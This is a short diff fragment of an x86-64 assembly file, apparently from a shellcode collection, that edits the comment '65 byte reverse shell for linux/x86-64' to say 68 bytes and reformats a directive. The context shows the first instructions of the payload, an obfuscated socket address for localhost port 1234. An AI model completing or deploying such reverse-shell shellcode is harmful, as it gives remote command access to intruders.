@@ -28,10 +28,10 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 65 byte reverse shell for linux/x86-64
+; 68 byte reverse shell for linux/x86-64
 ; odzhan
 
-    bits 64
+    bits    64
     
     mov     rax, ~0x0100007fd2040002
     not     rax
